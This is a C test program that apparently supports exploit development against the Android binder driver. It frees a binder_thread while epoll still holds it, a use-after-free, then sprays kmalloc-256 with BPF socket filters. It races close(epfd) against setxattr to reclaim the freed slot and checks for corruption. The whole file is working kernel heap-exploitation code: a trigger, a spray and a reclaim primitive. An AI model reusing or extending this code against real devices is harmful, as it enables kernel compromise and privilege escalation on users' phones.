/*
 * xattr_reclaim_test.c — Verify setxattr reclaims freed binder_thread slot
 *
 * Test: Does setxattr's transient kmalloc-256 actually land in the
 * freed binder_thread slot? Also check timing of close(epfd).
 *
 * Build: .\qemu\build-arm.bat src\xattr_reclaim_test.c xattr_reclaim_test
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BC_ENTER_LOOPER         0x630c

struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

static void read_slab(const char *cache, long *out) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512]; *out = -1;
    if (!f) return;
    while (fgets(line, sizeof(line), f))
        if (strncmp(line, cache, strlen(cache)) == 0 && line[strlen(cache)] == ' ')
            { sscanf(line + strlen(cache) + 1, "%ld", out); break; }
    fclose(f);
}

/* ========== TEST 1: Does setxattr use kmalloc-256? ========== */
static void test1(void) {
    printf("=== TEST 1: setxattr slab allocation ===\n");

    /* Create 200 files and setxattr on each to measure slab delta */
    long k256_before, k256_after;
    int sizes[] = { 180, 190, 200, 210, 220, 230, 240, 0 };

    for (int si = 0; sizes[si]; si++) {
        int sz = sizes[si];
        read_slab("kmalloc-256", &k256_before);
        char path[128];
        for (int i = 0; i < 100; i++) {
            snprintf(path, sizeof(path), "/data/local/tmp/.xrt_%d", i);
            int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd >= 0) { write(fd, "x", 1); close(fd); }
            char val[256];
            memset(val, 'Z', sz);
            setxattr(path, "user.test", val, sz, XATTR_CREATE);
        }
        read_slab("kmalloc-256", &k256_after);
        printf("  size=%d: k256 delta=%+ld (%.1f per setxattr)\n",
               sz, k256_after - k256_before, (k256_after - k256_before) / 100.0);

        /* Cleanup */
        for (int i = 0; i < 100; i++) {
            snprintf(path, sizeof(path), "/data/local/tmp/.xrt_%d", i);
            unlink(path);
        }
    }
    printf("\n");
}

/* ========== TEST 2: Race timing diagnostic ========== */
/* In this test, we check if close(epfd) during setxattr causes corruption. */

static volatile int t2_go = 0;
static int t2_epfd = -1;
static int t2_delay_us = 0;

static void *t2_closer(void *arg) {
    while (!t2_go);  /* tight spin, no yield */
    for (volatile int i = 0; i < t2_delay_us * 200; i++);
    close(t2_epfd);
    return NULL;
}

static void test2(void) {
    printf("=== TEST 2: Race timing diagnostic ===\n");

    int attempts = 500;
    int crashes = 0, timeouts = 0, normals = 0, leaks = 0;

    for (int a = 0; a < attempts; a++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);

            /* Pin to CPU 0 */
            cpu_set_t mask;
            CPU_ZERO(&mask);
            CPU_SET(0, &mask);
            sched_setaffinity(0, sizeof(mask), &mask);

            /* BPF spray */
            int socks[200];
            struct sock_filter insns[26];
            for (int j = 0; j < 25; j++) {
                insns[j].code = BPF_LD | BPF_IMM;
                insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
            }
            insns[25].code = BPF_RET | BPF_K;
            insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
            struct sock_fprog prog = { .len = 26, .filter = insns };
            for (int j = 0; j < 200; j++) {
                socks[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
                if (socks[j] >= 0)
                    setsockopt(socks[j], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            /* Setup binder UAF */
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            uint32_t mx = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
            uint32_t cmd = BC_ENTER_LOOPER;
            struct binder_write_read bwr;
            memset(&bwr, 0, sizeof(bwr));
            bwr.write_size = sizeof(cmd);
            bwr.write_buffer = (unsigned long)&cmd;
            ioctl(bfd, BINDER_WRITE_READ, &bwr);

            t2_epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(t2_epfd, EPOLL_CTL_ADD, bfd, &ev);

            /* FREE binder_thread */
            int thr = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &thr);

            /* Create xattr file */
            char path[128];
            snprintf(path, sizeof(path), "/data/local/tmp/.xrt2_%d", a);
            int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd >= 0) { write(fd, "x", 1); close(fd); }

            /* Prepare xattr value */
            char val[200];
            memset(val, 'Q', sizeof(val));
            memset(val + 44, 0, 4);  /* spinlock = 0 */
            *(uint32_t*)(val + 48) = 0xDEADBEEF;
            *(uint32_t*)(val + 52) = 0xCAFEBABE;

            /* Start closer thread */
            t2_go = 0;
            t2_delay_us = 5 + (a % 200);  /* 5-204 μs */

            pthread_t pt;
            pthread_create(&pt, NULL, t2_closer, NULL);

            t2_go = 1;
            int ret = setxattr(path, "user.leak", val, sizeof(val), XATTR_CREATE);

            pthread_join(pt, NULL);

            /* Check for corruption */
            char rbuf[200];
            memset(rbuf, 0, sizeof(rbuf));
            ssize_t rlen = getxattr(path, "user.leak", rbuf, sizeof(rbuf));

            int result = 0;  /* 0 = no leak, 42 = leak */
            if (rlen >= 56) {
                uint32_t v48 = *(uint32_t*)(rbuf + 48);
                uint32_t v52 = *(uint32_t*)(rbuf + 52);
                if (v48 != 0xDEADBEEF || v52 != 0xCAFEBABE) {
                    result = 42;
                    printf("  [%d] CORRUPTION! +48=0x%08x +52=0x%08x (delay=%dμs)\n",
                           a, v48, v52, t2_delay_us);
                }
            }

            unlink(path);
            for (int j = 0; j < 200; j++) if (socks[j] >= 0) close(socks[j]);
            close(bfd);

            _exit(result);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            if (WEXITSTATUS(status) == 42) {
                leaks++;
            } else if (WEXITSTATUS(status) == 0) {
                normals++;
            } else {
                crashes++;
            }
        } else if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            if (sig == SIGALRM) {
                timeouts++;
            } else {
                printf("  [%d] SIGNAL %d (delay=%dμs)\n", a, sig, 5 + (a % 200));
                crashes++;
            }
        }

        if (a % 100 == 99)
            printf("  Progress: %d/%d (normals=%d timeouts=%d crashes=%d leaks=%d)\n",
                   a + 1, attempts, normals, timeouts, crashes, leaks);
    }

    printf("\n  RESULTS: attempts=%d normals=%d timeouts=%d crashes=%d leaks=%d\n\n",
           attempts, normals, timeouts, crashes, leaks);
}

/* ========== TEST 3: Verify xattr buffer lifetime ========== */
/* Does the kmalloc buffer from setxattr persist during the entire syscall? */
/* We can't directly test this, but we can measure how long setxattr takes */
static void test3(void) {
    printf("=== TEST 3: setxattr duration measurement ===\n");

    char path[] = "/data/local/tmp/.xrt3";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { write(fd, "x", 1); close(fd); }

    char val[200];
    memset(val, 'Z', sizeof(val));

    struct timespec t1, t2;
    long total_ns = 0;
    int count = 100;

    for (int i = 0; i < count; i++) {
        removexattr(path, "user.test");
        clock_gettime(CLOCK_MONOTONIC, &t1);
        setxattr(path, "user.test", val, sizeof(val), XATTR_CREATE);
        clock_gettime(CLOCK_MONOTONIC, &t2);
        long ns = (t2.tv_sec - t1.tv_sec) * 1000000000L + (t2.tv_nsec - t1.tv_nsec);
        total_ns += ns;
    }

    printf("  Average setxattr duration: %ld ns (%.1f μs)\n",
           total_ns / count, total_ns / count / 1000.0);
    unlink(path);
    printf("\n");
}

int main(int argc, char **argv) {
    printf("=== xattr Reclaim Diagnostic ===\n\n");
    signal(SIGCHLD, SIG_DFL);

    test1();
    test3();
    test2();

    return 0;
}
